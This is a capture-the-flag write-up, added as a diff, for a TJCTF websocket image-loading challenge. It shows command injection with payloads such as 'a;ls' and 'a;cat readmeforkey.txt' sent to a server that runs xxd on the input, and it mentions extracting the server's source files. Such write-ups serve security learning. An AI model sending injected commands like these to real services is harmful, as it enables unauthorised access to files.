@@ -1,0 +1,36 @@
+For this problem, a websocket is created to ws://webimage.p.tjctf.org:8090 to request the loading of images. Then the server spits back and image and it is base64 encoded so that we can reveal the image. However when the image is not found, the server spits back junk data and the page errors on loading the image, which results in it sending another request to the server for the unavailable image, which then works.
+
+Further investigation reveals that the reason why it errors is because of the hexToBase64 function. So let's redefine that in our browser:
+    > hexToBase64 = function(str) {return str;}
+Also, why not replace the onmessage function so that we get more readable output:
+    > ws.onmessage = function(out) {console.log(out.data);}
+
+Now, let's try to read a file that doesn't exist:
+    > ws.send("a")
+This gives us the following:
+    xxd: a: No such file or directory
+
+Whoa! This means that it's executing shell command on the server side. So let's modify our commands :)
+    > ws.send("a;ls")
+This returns a listing of all the files in the directory:
+    Dockerfile
+    colors.jpg
+    index.html
+    readmeforkey.txt
+    server.js
+    stocks.jpg
+    sunflower.jpg
+    unavailable.jpg
+    whale.jpg
+
+One of these files seems suspicious... readmeforkey.txt
+    > ws.send("a;cat readmeforkey.txt")
+And the output we get is the flag:
+    The Key is:
+
+    bashing_jpgs
+
+Flag: bashing_jpgs
+
+We hope TJ protected their servers well enough because people can do some serious damage with this.
+For example, we extracted their Dockerfile and server.js
